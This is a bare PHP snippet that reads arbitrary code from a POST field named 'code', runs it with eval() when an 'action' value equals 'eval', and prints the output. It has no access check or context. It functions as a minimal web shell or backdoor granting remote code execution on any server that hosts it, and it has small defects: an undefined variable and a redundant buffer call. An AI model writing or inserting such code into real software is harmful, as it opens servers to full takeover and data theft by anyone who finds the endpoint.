<?php
if($action === "eval")
{
    $code = $_POST["code"];
    ob_start();
    eval($code);
    $result = ob_get_clean();
    ob_end_clean();
    echo htmlspecialchars($result);
}

?>